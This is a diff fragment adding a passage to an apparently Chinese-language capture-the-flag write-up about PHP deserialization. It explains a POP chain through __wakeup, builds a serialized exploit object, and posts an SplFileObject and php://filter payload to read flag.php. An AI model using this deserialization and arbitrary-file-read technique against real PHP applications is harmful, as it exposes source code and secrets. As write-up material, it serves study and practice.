@@ -314,3 +314,17 @@ if(isset($_GET['d'])){
 }
 ?>
 ```
+反序列化从wakeup方法开始指向hahaha()函数，进入hahaha函数里要让name＝“one class”，让leader->name="ing",leader->rank="department",所以让leader指向teacher里，最后执行IPO，要让headmaster＝“ong”，post给a，b传参构造读伪协议 使用 splFileObject 类来读取文件内容  
+```
+$a=new school;
+$a->department=new classroom;
+$a->department->name="one class";
+$a->department->leader=new teacher;
+$a->department->leader->name="ing";
+$a->department->leader->rank="department";
+$a->headmaster="ong";
+echo urlencode(base64_encode(serialize($a)));
+
+
+```
+post：a=SplFileObject&b=php://filter/convert.base64-encode/resource=flag.php
